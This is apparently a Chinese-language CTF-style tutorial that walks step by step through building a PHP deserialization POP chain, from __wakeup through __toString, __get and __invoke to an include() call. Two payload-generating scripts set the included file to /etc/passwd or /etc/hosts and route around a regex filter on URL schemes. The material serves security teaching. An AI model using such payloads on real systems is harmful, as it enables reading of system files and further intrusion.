攻击反序列化漏洞pop链 - 示例4审计确定目标：include($value); 文件包含漏洞
问1：谁会执行 Modifier 的 append 呢？
答1：Modifier的__invoke 会执行 Modifier 的
append

问2：谁会触发 Modifier 的 __invoke 呢？
答2：如果$this-&gt;p是Modifier的对象 Test的__get
会触发 Modifier 的 __invoke

问3：谁会触发 Test 的 __get 呢？
答3：如果$this-&gt;str是Test的对象，Show的__toString会触
发 Test 的 __get

问4：谁会触发 Show 的 __toString 呢？
答4：如果 $this-&gt;source是Show类的对象，Show的
wakeup 就会触发 Show的toString

问5：谁会触发 Show 的 __wakeup 呢？
答5：反序列化自动触发

编写 payload&lt;?php
class Modifier &#123;
    protected  $var = &quot;/etc/passwd&quot;;
    public function append($value)&#123; // 问1：谁会执行 Modifier 的 append 呢？
        include($value);   // 目标
    &#125;
    public function __invoke()&#123;   // 问2：谁会触发 Modifier 的 __invoke 呢？
        $this-&gt;append($this-&gt;var);  // 答1：Modifier的__invoke 会执行 Modifier 的 append
    &#125;
&#125;

class Show&#123;
    public $source;
    public $str;
    public function __construct()&#123;
        $this-&gt;str = new Test();
        // $this-&gt;source = new Show();
        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
    &#125;
    public function __toString()&#123; // 问4：谁会触发 Show 的 __toString 呢？
        return $this-&gt;str-&gt;source;  // 答3：如果$this-&gt;str是Test的对象，Show的__toString会触发 Test 的 __get
    &#125;

    public function __wakeup()&#123; //问5：谁会触发 Show 的 __wakeup 呢？反序列化自动触发！
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123; // 答4：如果 $this-&gt;source是Show类的对象，就会触发 Show的__toString
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        &#125;
    &#125;
&#125;

class Test&#123;
    public $p;
    public function __construct()&#123;
        $this-&gt;p = new Modifier();
    &#125;

    public function __get($key)&#123; // 问3：谁会触发 Test 的 __get 呢？
        $function = $this-&gt;p;
        return $function(); // 答2：如果$this-&gt;p是Modifier的对象 Test的__get 会触发 Modifier 的 __invoke
    &#125;
&#125;

$DC = new Show();
$DC-&gt;source = $DC;
echo urlencode(serialize($DC));
?&gt;

&lt;?php
class Modifier &#123;
    protected $var;

    public function append($value) &#123;
        include($value);
    &#125;

    public function __invoke() &#123;
        $this-&gt;append($this-&gt;var);
    &#125;
&#125;

class Show &#123;
    public $source;
    public $str;

    public function __construct($file = &#x27;index.php&#x27;) &#123;
        $this-&gt;source = $file;
        echo &#x27;Welcome to &#x27; . $this-&gt;source . &quot;&lt;br&gt;&quot;;
    &#125;

    public function __toString() &#123;
        return $this-&gt;str-&gt;source;
    &#125;

    public function __wakeup() &#123;
        if (preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        &#125;
    &#125;
&#125;

class Test &#123;
    public $p;

    public function __construct() &#123;
        $this-&gt;p = array();
    &#125;

    public function __get($key) &#123;
        $function = $this-&gt;p;
        return $function();
    &#125;
&#125;

// 创建Modifier对象
$m = new Modifier();

// 通过反射设置protected属性$var
$ref = new ReflectionClass(&#x27;Modifier&#x27;);
$prop = $ref-&gt;getProperty(&#x27;var&#x27;);
$prop-&gt;setAccessible(true);
$prop-&gt;setValue($m, &#x27;/etc/hosts&#x27;); // 修改为 /etc/hosts

// 创建Test对象
$t = new Test();
$t-&gt;p = $m; // 设置$p为Modifier对象

// 创建内部Show对象
$s = new Show(&#x27;index.php&#x27;);
$s-&gt;str = $t; // 设置$str为Test对象

// 创建外部Show对象
$s2 = new Show(&#x27;index.php&#x27;);
$s2-&gt;source = $s; // 关键：将$source设置为内部Show对象(不是字符串)
$s2-&gt;str = null;

